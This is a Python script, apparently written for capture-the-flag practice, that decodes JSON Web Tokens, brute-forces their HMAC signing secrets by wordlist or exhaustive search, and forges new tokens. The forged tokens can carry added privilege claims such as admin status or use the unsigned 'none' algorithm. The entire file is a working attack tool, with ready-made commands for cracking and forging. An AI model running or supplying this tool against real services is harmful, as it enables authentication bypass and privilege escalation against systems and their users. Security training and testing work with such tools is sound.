#!/usr/bin/env python3
"""
jwt_cracker.py - CTF JWT Secret Brute Forcer

Decode JWT tokens, brute force HMAC secrets, and forge new tokens.
Handles HS256, HS384, HS512 signature algorithms.

Usage:
    python3 jwt_cracker.py decode <token>
    python3 jwt_cracker.py crack <token> --wordlist rockyou.txt
    python3 jwt_cracker.py crack <token> --brute --charset lower --max-length 6
    python3 jwt_cracker.py forge <token> --secret <key> --payload '{"admin": true}'
"""

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import os
import string
import struct
import sys
import threading
import time

# ANSI colors
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'


CHARSETS = {
    'lower':    string.ascii_lowercase,
    'upper':    string.ascii_uppercase,
    'alpha':    string.ascii_letters,
    'digits':   string.digits,
    'alnum':    string.ascii_letters + string.digits,
    'all':      string.ascii_letters + string.digits + string.punctuation,
    'custom':   '',
}

HMAC_ALGORITHMS = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}


def print_header(text):
    print(f"\n{C.BOLD}{C.CYAN}{'─' * 60}")
    print(f"  {text}")
    print(f"{'─' * 60}{C.RESET}")


def print_field(label, value, color=C.GREEN):
    print(f"  {C.BOLD}{label + ':':20s}{C.RESET} {color}{value}{C.RESET}")


# ─── JWT Utilities ────────────────────────────────────────────────────────────

def b64url_decode(data):
    """Decode base64url (no padding)."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def b64url_encode(data):
    """Encode to base64url (no padding)."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def decode_jwt(token):
    """Decode a JWT token into header, payload, signature."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")

    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        raise ValueError(f"Invalid JWT header: {e}")

    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        raise ValueError(f"Invalid JWT payload: {e}")

    signature = b64url_decode(parts[2])

    return header, payload, signature, parts[0] + '.' + parts[1]


def sign_jwt(header, payload, secret, algorithm='HS256'):
    """Sign a JWT with the given secret."""
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}"

    hash_func = HMAC_ALGORITHMS.get(algorithm)
    if not hash_func:
        raise ValueError(f"Unsupported algorithm: {algorithm}")

    sig = hmac.new(
        secret.encode() if isinstance(secret, str) else secret,
        signing_input.encode(),
        hash_func
    ).digest()

    return f"{signing_input}.{b64url_encode(sig)}"


def verify_signature(signing_input, signature, secret, algorithm):
    """Verify a JWT signature with the given secret."""
    hash_func = HMAC_ALGORITHMS.get(algorithm)
    if not hash_func:
        return False

    expected = hmac.new(
        secret.encode() if isinstance(secret, str) else secret,
        signing_input.encode(),
        hash_func
    ).digest()

    return hmac.compare_digest(expected, signature)


# ─── Commands ─────────────────────────────────────────────────────────────────

def cmd_decode(args):
    """Decode and display JWT contents."""
    try:
        header, payload, signature, _ = decode_jwt(args.token)
    except ValueError as e:
        print(f"{C.RED}Error: {e}{C.RESET}", file=sys.stderr)
        sys.exit(1)

    print_header("JWT Decoded")

    # Header
    print(f"\n  {C.BOLD}Header:{C.RESET}")
    alg = header.get('alg', 'unknown')
    for key, value in header.items():
        color = C.YELLOW if key == 'alg' else C.GREEN
        print(f"    {C.DIM}{key}:{C.RESET} {color}{value}{C.RESET}")

    # Payload
    print(f"\n  {C.BOLD}Payload:{C.RESET}")
    for key, value in payload.items():
        color = C.GREEN

        # Highlight interesting fields
        if key in ('admin', 'role', 'is_admin', 'isAdmin', 'privilege'):
            color = C.RED
        elif key in ('exp', 'iat', 'nbf'):
            # Convert timestamps
            try:
                from datetime import datetime
                ts = datetime.fromtimestamp(int(value))
                value = f"{value} ({ts.strftime('%Y-%m-%d %H:%M:%S')})"
            except (ValueError, TypeError, OSError):
                pass

        # Check for flag patterns
        import re
        if re.search(r'(flag|ctf)\{', str(value), re.IGNORECASE):
            color = C.RED
            print(f"    {C.DIM}{key}:{C.RESET} {color}{C.BOLD}⚑ {value}{C.RESET}")
            continue

        print(f"    {C.DIM}{key}:{C.RESET} {color}{value}{C.RESET}")

    # Signature
    sig_hex = signature.hex()
    print(f"\n  {C.BOLD}Signature:{C.RESET}")
    print(f"    {C.DIM}{sig_hex[:40]}...{C.RESET}")

    # Algorithm warnings
    if alg == 'none':
        print(f"\n  {C.RED}{C.BOLD}⚠ Algorithm is 'none'! Token accepts any payload!{C.RESET}")
    elif alg.startswith('HS'):
        print(f"\n  {C.YELLOW}ℹ HMAC algorithm — secret can be brute-forced{C.RESET}")
        print(f"  {C.DIM}  Use: {sys.argv[0]} crack <token> --wordlist <file>{C.RESET}")

    print()


def cmd_crack(args):
    """Brute force JWT HMAC secret."""
    try:
        header, payload, signature, signing_input = decode_jwt(args.token)
    except ValueError as e:
        print(f"{C.RED}Error: {e}{C.RESET}", file=sys.stderr)
        sys.exit(1)

    algorithm = header.get('alg', 'HS256')
    if algorithm not in HMAC_ALGORITHMS:
        print(f"{C.RED}Error: Cannot crack algorithm '{algorithm}'. "
              f"Only HMAC (HS256/384/512) supported.{C.RESET}")
        sys.exit(1)

    print_header(f"JWT Secret Cracker")
    print_field('Algorithm', algorithm)
    print_field('Payload Preview', json.dumps(payload)[:50] + '...')

    if not args.wordlist and not args.brute:
        print(f"{C.RED}Error: Specify --wordlist and/or --brute{C.RESET}")
        sys.exit(1)

    attempts = 0
    start_time = time.time()
    stop_progress = threading.Event()

    def progress_reporter():
        while not stop_progress.is_set():
            elapsed = time.time() - start_time
            rate = attempts / elapsed if elapsed > 0 else 0
            print(f"\r  {C.DIM}Attempts: {attempts:,} | "
                  f"Rate: {rate:,.0f}/s | "
                  f"Elapsed: {elapsed:.1f}s{C.RESET}", end='', flush=True)
            stop_progress.wait(0.5)

    progress_thread = threading.Thread(target=progress_reporter, daemon=True)
    progress_thread.start()

    found_secret = None

    # Wordlist attack
    if args.wordlist:
        for wl_path in args.wordlist:
            if found_secret:
                break
            try:
                with open(wl_path, 'r', errors='replace') as f:
                    for line in f:
                        secret = line.strip()
                        if not secret:
                            continue
                        attempts += 1
                        if verify_signature(signing_input, signature, secret, algorithm):
                            found_secret = secret
                            break
            except FileNotFoundError:
                print(f"\n{C.RED}Error: '{wl_path}' not found.{C.RESET}")

    # Brute force attack
    if not found_secret and args.brute:
        charset = CHARSETS.get(args.charset, args.charset)
        if args.charset == 'custom' and args.custom_charset:
            charset = args.custom_charset

        for length in range(args.min_length, args.max_length + 1):
            if found_secret:
                break
            for combo in itertools.product(charset, repeat=length):
                secret = ''.join(combo)
                attempts += 1
                if verify_signature(signing_input, signature, secret, algorithm):
                    found_secret = secret
                    break

    stop_progress.set()
    progress_thread.join()
    elapsed = time.time() - start_time
    print()  # Clear progress line

    if found_secret:
        print(f"\n  {C.RED}{C.BOLD}{'═' * 40}")
        print(f"  ⚑ SECRET FOUND!")
        print(f"  {'═' * 40}{C.RESET}")
        print(f"  {C.GREEN}{C.BOLD}  Secret: {found_secret}{C.RESET}")
        print(f"  {C.DIM}  Attempts: {attempts:,} in {elapsed:.2f}s{C.RESET}")
        print(f"\n  {C.YELLOW}Forge a new token:{C.RESET}")
        print(f"  {C.DIM}  {sys.argv[0]} forge <token> --secret '{found_secret}' "
              f"--payload '{{\"admin\": true}}'{C.RESET}")
    else:
        print(f"\n  {C.YELLOW}✗ Secret not found.{C.RESET}")
        print(f"  {C.DIM}  Attempts: {attempts:,} in {elapsed:.2f}s{C.RESET}")

    print()
    return found_secret


def cmd_forge(args):
    """Forge a new JWT with modified payload."""
    try:
        header, payload, _, _ = decode_jwt(args.token)
    except ValueError as e:
        print(f"{C.RED}Error: {e}{C.RESET}", file=sys.stderr)
        sys.exit(1)

    if not args.secret:
        print(f"{C.RED}Error: --secret is required for forging.{C.RESET}", file=sys.stderr)
        sys.exit(1)

    algorithm = header.get('alg', 'HS256')

    # Apply payload modifications
    if args.payload:
        try:
            new_payload = json.loads(args.payload)
            payload.update(new_payload)
        except json.JSONDecodeError as e:
            print(f"{C.RED}Error: Invalid JSON payload: {e}{C.RESET}", file=sys.stderr)
            sys.exit(1)

    # Override algorithm if specified
    if args.algorithm:
        header['alg'] = args.algorithm
        algorithm = args.algorithm

    # Handle 'none' algorithm attack
    if algorithm == 'none':
        header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
        forged = f"{header_b64}.{payload_b64}."
    else:
        forged = sign_jwt(header, payload, args.secret, algorithm)

    print_header("Forged JWT")
    print(f"\n  {C.BOLD}Modified Payload:{C.RESET}")
    for key, value in payload.items():
        print(f"    {C.DIM}{key}:{C.RESET} {C.GREEN}{value}{C.RESET}")

    print(f"\n  {C.BOLD}Token:{C.RESET}")
    print(f"  {C.GREEN}{forged}{C.RESET}")

    if args.output:
        with open(args.output, 'w') as f:
            f.write(forged)
        print(f"\n  {C.DIM}Saved to: {args.output}{C.RESET}")

    print()
    return forged


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='CTF JWT Cracker — decode, brute force, and forge JWTs',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s decode eyJhbGci...
  %(prog)s crack eyJhbGci... --wordlist rockyou.txt
  %(prog)s crack eyJhbGci... --brute --charset lower --max-length 5
  %(prog)s forge eyJhbGci... --secret s3cret --payload '{"admin": true}'
  %(prog)s forge eyJhbGci... --secret x --algorithm none
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Operation')

    # Decode
    dec_parser = subparsers.add_parser('decode', help='Decode and display JWT')
    dec_parser.add_argument('token', help='JWT token')
    dec_parser.add_argument('--no-color', action='store_true', help='Disable color')

    # Crack
    crack_parser = subparsers.add_parser('crack', help='Brute force JWT secret')
    crack_parser.add_argument('token', help='JWT token')
    crack_parser.add_argument('--wordlist', '-w', type=str, action='append',
                              help='Wordlist file(s)')
    crack_parser.add_argument('--brute', '-b', action='store_true',
                              help='Use brute force')
    crack_parser.add_argument('--charset', '-c', type=str, default='alnum',
                              choices=list(CHARSETS.keys()),
                              help='Character set (default: alnum)')
    crack_parser.add_argument('--custom-charset', type=str,
                              help='Custom character set')
    crack_parser.add_argument('--min-length', type=int, default=1,
                              help='Min length (default: 1)')
    crack_parser.add_argument('--max-length', '-m', type=int, default=6,
                              help='Max length (default: 6)')
    crack_parser.add_argument('--no-color', action='store_true', help='Disable color')

    # Forge
    forge_parser = subparsers.add_parser('forge', help='Forge JWT with modified payload')
    forge_parser.add_argument('token', help='Original JWT token')
    forge_parser.add_argument('--secret', '-s', type=str, required=True,
                              help='Signing secret')
    forge_parser.add_argument('--payload', '-p', type=str,
                              help='JSON payload to merge')
    forge_parser.add_argument('--algorithm', '-a', type=str,
                              help='Override algorithm (e.g., none, HS256)')
    forge_parser.add_argument('--output', '-o', type=str,
                              help='Save forged token to file')
    forge_parser.add_argument('--no-color', action='store_true', help='Disable color')

    args = parser.parse_args()

    if getattr(args, 'no_color', False):
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == 'decode':
        cmd_decode(args)
    elif args.command == 'crack':
        cmd_crack(args)
    elif args.command == 'forge':
        cmd_forge(args)


if __name__ == '__main__':
    main()
